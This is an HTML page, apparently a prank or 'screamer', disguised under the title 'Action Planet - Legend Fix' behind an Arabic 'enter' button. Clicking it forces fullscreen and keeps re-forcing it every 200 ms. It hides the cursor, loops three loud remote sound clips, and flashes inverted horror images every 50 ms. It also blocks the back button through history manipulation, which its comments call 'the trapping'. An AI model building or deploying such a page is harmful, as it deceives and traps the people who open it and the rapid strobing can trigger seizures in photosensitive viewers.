<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Action Planet - Legend Fix</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
        #entry { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; z-index: 10000; background: #ffffff; }
        .btn-entry { background: #ff0000; color: #fff; border: 8px solid #000; padding: 25px 60px; font-size: 30px; font-weight: bold; border-radius: 50px; cursor: pointer; }
        
        #mainView { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
        .horror-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; }

        @keyframes chaos {
            0% { transform: translate(0, 0) scale(1); filter: contrast(1); }
            50% { transform: translate(-30px, 20px) scale(1.5) rotate(5deg); filter: contrast(3) invert(1); }
            100% { transform: translate(30px, -20px) scale(1.2) rotate(-5deg); }
        }
        .active-glitch { opacity: 1 !important; animation: chaos 0.02s infinite linear; }
    </style>
</head>
<body>

    <div id="entry">
        <button class="btn-entry" onclick="startSystem()">دخول</button>
    </div>

    <div id="mainView">
        <img class="horror-img" id="img1" src="https://telegra.ph/file/0c9783f946c5970c79e72.jpg">
        <img class="horror-img" id="img2" src="https://telegra.ph/file/984b6555198e3b330349b.jpg">
        <img class="horror-img" id="img3" src="https://telegra.ph/file/07f4369e9a4f664a79668.jpg">
        <img class="horror-img" id="img4" src="https://telegra.ph/file/5a676b059635f308a0963.jpg">
        <img class="horror-img" id="img5" src="https://telegra.ph/file/8296a256966141c2980bc.jpg">
    </div>

    <script>
        const imageIds = ['img1', 'img2', 'img3', 'img4', 'img5'];
        const tracks = [
            "https://www.myinstants.com/media/sounds/twahwih-94526.mp3",
            "https://www.myinstants.com/media/sounds/w-rbk-shwl-hd-64729.mp3",
            "https://www.myinstants.com/media/sounds/m-e-o-w-82698.mp3"
        ];
        let currentIdx = 0;

        function startSystem() {
            document.getElementById('entry').style.display = 'none';
            document.getElementById('mainView').style.display = 'block';

            // تفعيل ملء الشاشة سواسوة
            let el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();

            // تشغيل الأصوات الثلاثة سواسوة
            tracks.forEach(src => {
                let a = new Audio(src);
                a.loop = true;
                const p = () => a.play().catch(() => setTimeout(p, 100));
                p();
            });

            // تبديل الصور بسرعة سواسوة
            setInterval(() => {
                document.getElementById(imageIds[currentIdx]).classList.remove('active-glitch');
                currentIdx = (currentIdx + 1) % imageIds.length;
                document.getElementById(imageIds[currentIdx]).classList.add('active-glitch');
            }, 50);

            // الحبس سواسوة
            setInterval(() => { if (!document.fullscreenElement) el.requestFullscreen(); }, 200);
            history.pushState(null, null, location.href);
            window.onpopstate = () => history.go(1);
        }
    </script>
</body>
</html>
